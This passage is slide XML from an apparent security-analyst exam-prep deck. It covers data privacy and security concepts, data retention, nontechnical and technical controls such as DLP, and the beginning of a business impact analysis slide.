              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Security is about the data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Privacy vs. confidentiality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Confidentiality is about the data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Privacy is about keeping an individual’s identity secure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data security is protected through controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Privacy has to do with data usage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761</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · DATA PRIVACY AND SECURITY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Data Privacy and Security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Types of data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Personal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Personal health</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Financial</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Copyrighted</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Legal requirements for data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  GDPR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  HIPAA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  US copyright law</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  PCI DSS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762</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · NONTECHNICAL CONTROLS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Nontechnical Controls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Nontechnical controls are the administrative and policy measures that govern how data is handled, complementing technical safeguards with rules, roles, and agreements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  They include data ownership, which assigns accountability for a data set, data classification, which labels data by sensitivity to drive handling requirements, and data confidentiality reinforced by a nondisclosure agreement (NDA) that legally binds parties to protect information.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data sovereignty, the idea that data is subject to the laws of the country where it is collected or stored, is a core principle behind the EU's GDPR, which also mandates data minimization (collect only what is needed) and data purpose limitation (use data only for the stated purpose).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because these controls define the compliance boundaries the technical program must enforce, and violations expose the organization to regulatory fines and legal liability.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions on data governance terms such as data classification, data ownership, NDAs, data sovereignty as the principle behind GDPR, and data minimization and purpose limitation.</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763</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · NONTECHNICAL CONTROLS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Nontechnical Controls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Data ownership</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data classification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data confidentiality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Nondisclosure agreement (NDA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data sovereignty</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Principle behind GDPR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data minimization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data purpose limitation</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764</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · NONTECHNICAL CONTROLS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Data Retention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Data retention establishes standards that answer what data the organization keeps, how long it is kept, where it is stored, and how it is securely deleted at the end of its lifecycle.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  These standards are shaped by legal, regulatory, and business requirements, balancing the need to preserve data for compliance and investigations against the risk and cost of holding it too long.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Effective retention relies on supporting practices including taxonomy, which defines how data is stored and organized for future recall, normalization, which structures data so it can be related and turned into meaningful reports, and indexing, which speeds retrieval.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because well-defined retention ensures logs and evidence exist long enough to investigate incidents while avoiding the liability of hoarding data that should have been destroyed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions covering retention standards (what, how long, where, and how to delete data) and the supporting concepts of taxonomy, normalization, and indexing.</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765</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · NONTECHNICAL CONTROLS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Data Retention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Standards</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  What data do we keep?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  How long do we keep this data?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Where do we keep this data?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  How do we delete data?</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766</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · NONTECHNICAL CONTROLS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Data Retention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Taxonomy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  How data is stored and organized for future recall</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Normalization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Makes it possible to relate data and extract meaningful reports</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Indexing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Way of organizing data for searchability and rapid recall</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767</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · TECHNICAL CONTROLS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Technical Controls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Technical controls are the technology-based safeguards that enforce data security and privacy directly within systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Access controls limit access to resources by enforcing identification, authentication, and authorization, ensuring only approved subjects reach protected data, while encryption protects confidentiality of data at rest and in transit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  To share data while preserving privacy, analysts apply data masking and deidentification to obscure or remove identifying fields, tokenization to substitute sensitive values with non-sensitive tokens, and digital rights management (DRM) to control how content can be used after it is distributed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because these controls are the concrete mechanisms that turn privacy policy into enforced protection, enabling safe use and sharing of sensitive data without exposing individuals.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions matching privacy-preserving technical controls such as encryption, data masking, deidentification, tokenization, and DRM to their appropriate use cases.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768</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · TECHNICAL CONTROLS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Technical Controls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Access controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Limit access to certain resources</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Identification, authentication, authorization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Encryption</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Protects confidentiality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Sharing data while preserving privacy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Data masking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Deidentification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Tokenization</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769</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · TECHNICAL CONTROLS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Technical Controls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Digital rights management (DRM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Watermarking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Geographic access requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Geoblocking</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770</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · TECHNICAL CONTROLS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Technical Controls (3)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Data loss prevention (DLP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Process:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Create data inventories</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Monitor data flows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Implement, test, tune</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  DLP solution placement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Network DLP (NDLP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Endpoint DLP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Hybrid DLP</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771</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · BUSINESS IMPACT ANALYSIS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Business Impact Analysis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A Business Impact Analysis (BIA) is a structured study that identifies an organization's critical business functions and the maximum tolerable downtime and disruption each can withstand before the harm becomes unacceptable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It weighs multiple impact dimensions for each function: operational disruption and lost productivity, direct and indirect financial losses, regulatory and legal responsibilities that a disruption would breach, and damage to the organization's reputation and customer trust.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The BIA feeds recovery objectives such as the Recovery Time Objective (RTO) and Recovery Point Objective (RPO) that drive continuity and disaster-recovery planning.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
